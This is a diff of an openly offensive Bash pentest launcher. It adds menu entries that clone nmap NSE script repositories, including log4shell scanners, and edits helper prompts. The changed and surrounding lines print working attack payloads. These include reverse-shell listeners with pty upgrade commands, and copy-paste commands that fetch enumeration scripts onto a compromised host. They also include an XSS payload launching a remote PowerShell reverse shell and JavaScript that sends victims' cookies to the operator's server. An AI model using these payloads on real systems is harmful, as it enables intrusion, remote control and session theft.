@@ -41,6 +41,17 @@ function ScaricaIn
 	echo "Downloaded ""$2"
 }
 
+function NSEgo
+{
+	Clona "$1"
+	echo "Do you want copy nse script in nmap /usr/share/nmap/scripts"
+	read -p "(Y/n, default n): " RSP
+	if [[ "$RSP" == "Y" ]];
+	then
+		cp $1/*.nse /usr/share/nmap/scripts/
+	fi
+}
+
 function Installa
 {
 	echo "This utility will try to install your chosen repo. Digit the repo folder without slash '/'"
@@ -952,6 +963,11 @@ while true; do
 	echo "$SEP"
 	echo "NGINX"
 	Stampa " 2461. stark0de/nginxpwner"
+	echo "$SEP"
+	echo "NSE"
+	Stampa " 2626. Diverto/nse-log4shell" "2627. psc4re/NSE-scripts" "2628. hackertarget/nmap-nse-scripts"
+	Stampa " 2629. hkm/nmap-nse-scripts" "2630. takeshixx/nmap-scripts" "2631. giterlizzi/nmap-log4shell"
+	Stampa " 2632. 4ARMED/nmap-nse-scripts"
 	echo "$SEP"
 	echo "NTP"
 	Stampa " 178. PentesterES/Delorean"
@@ -2066,7 +2082,7 @@ while true; do
 		read -p "digit a number of port for the remote Windows Reverse Shell: " PORTA
 		if [[ "$PORTA" =~ ^[0-9]+$ ]];
 		then
-			echo "if you want use winallenum, please copy and paste this command line"
+			echo "if you want use winallenum, please COPY and PASTE this command line"
 			echo "[COPY+PASTE] invoke-webrequest -uri \"https://raw.githubusercontent.com/FabioDefilippo/winallenum/master/winallenum.ps1\" -outfile winallenum.tmp; get-content -path winallenum.tmp | set-content -encoding default -path winallenum.ps1; remove-item -path winallenum.tmp"
 			rlwrap nc -lvnp $PORTA
 		fi
@@ -2075,10 +2091,10 @@ while true; do
 		read -p "digit a number of port for the remote Linux Reverse Shell: " PORTA
 		if [[ "$PORTA" =~ ^[0-9]+$ ]];
 		then
-			echo "In remote shell, paste these two commands"
+			echo "In remote shell, COPY and PASTE these two commands in remote machine'shell"
 			echo "[COPY+PASTE] python -c 'import pty; pty.spawn(\"/bin/bash\")'"
 			echo "[COPY+PASTE] TERM=xterm"
-			echo "After connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo'"
+			echo "After connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo; fg'"
 			echo "if you want use linuxallenum, copy and paste this script for the last step"
 			echo "[COPY+PASTE] wget --no-check-certificate \"https://raw.githubusercontent.com/FabioDefilippo/linuxallenum/master/linuxallenum.sh\""
 			nc -lvnp $PORTA
@@ -2101,7 +2117,7 @@ while true; do
 				BSF=$(iconv -f UTF-8 -t UTF-16LE "$FILEPATH" | base64 -w 0)
 				echo "$BSF"
 				echo "$BSF" | xclip -selection clipboard
-				echo -ne "\ncopied to clipboard\npaste to winallenum in remote machine\n"
+				echo -ne "\ncopied to clipboard\nPASTE to winallenum in remote machine\n"
 				read
 			else
 				echo "$FILEPATH"" does not exist"
@@ -2119,7 +2135,7 @@ while true; do
 				BSF=$(base64 "$FILEPATH" -w 0)
 				echo "echo -n \"$BSF\" | base64 -d > script"
 				echo "$BSF" | xclip -selection clipboard
-				echo -ne "\ncopied to clipboard\npaste to linuxallenum in remote machine\n"
+				echo -ne "\ncopied to clipboard\nPASTE to linuxallenum in remote machine\n"
 				read
 			else
 				echo "$FILEPATH"" does not exist"
@@ -9459,9 +9475,11 @@ while true; do
 			if [[ "$ENFL" != "" ]];
 			then
 				zip -e "$ENFL" "$FL"
-				echo "paste this in linuxallenum"
+				echo "PASTE this in linuxallenum"
 				echo "or decode with base64 then unzip"
-				base64 "$ENFL" -w 0 | xclip -selection clipboard
+				MIO=$(base64 "$ENFL" -w 0)
+				echo "$MIO"
+				echo "$MIO" | xclip -selection clipboard
 			fi
 		fi
 	;;
@@ -9681,7 +9699,7 @@ while true; do
 			then
 				echo -ne "\nInvoke-PowerShellTcp -Reverse -IPAddress ""$MIP"" -Port ""$MPRT" >> Invoke-PowerShellTcp.ps1
 				python3 -m http.server &
-				echo "Paste this payload for XSS"
+				echo "PASTE this payload for XSS"
 				echo "[COPY+PASTE] | powershell -exec bypass -f \\\\\\\\""$MIP""\\\\""Invoke-PowerShellTcp.ps1"
 				rlwrap nc -lvnp "$MPRT"
 			fi
@@ -10869,8 +10887,8 @@ while true; do
 			then
 				echo "document.write('document.cookie');"
 				echo "document.write('<img src=\"""$MIP""/?'+document.cookie+'\">');" > ./img.js
-				echo "Copy and Pate this javascript code to receive via netcat the cookie in HTTP GET response"
-				echo "<script src=\"""$TIP""/img.js\"></script>"
+				echo "COPY and PASTE this javascript code to receive via netcat the cookie in HTTP GET response"
+				echo "[COPY+PASTE] <script src=\"""$TIP""/img.js\"></script>"
 				if [[ "$MIP" == "https://"* ]];
 				then
 					sudo nc -lvnp 443
@@ -11331,6 +11349,33 @@ while true; do
 					POS=""
 				fi
 			fi
+		fi
+	;;
+	"2626")
+		NSEgo "Diverto/nse-log4shell"
+	;;
+	"2627")
+		NSEgo "psc4re/NSE-scripts"
+	;;
+	"2628")
+		NSEgo "hackertarget/nmap-nse-scripts"
+	;;
+	"2629")
+		if [[ $(Warning) == "Y" ]];
+		then
+			NSEgo "hkm/nmap-nse-scripts"
+		fi
+	;;
+	"2630")
+		NSEgo "takeshixx/nmap-scripts"
+	;;
+	"2631")
+		NSEgo "giterlizzi/nmap-log4shell"
+	;;
+	"2632")
+		if [[ $(Warning) == "Y" ]];
+		then
+			NSEgo "4ARMED/nmap-nse-scripts"
 		fi
 	;;
 	*)
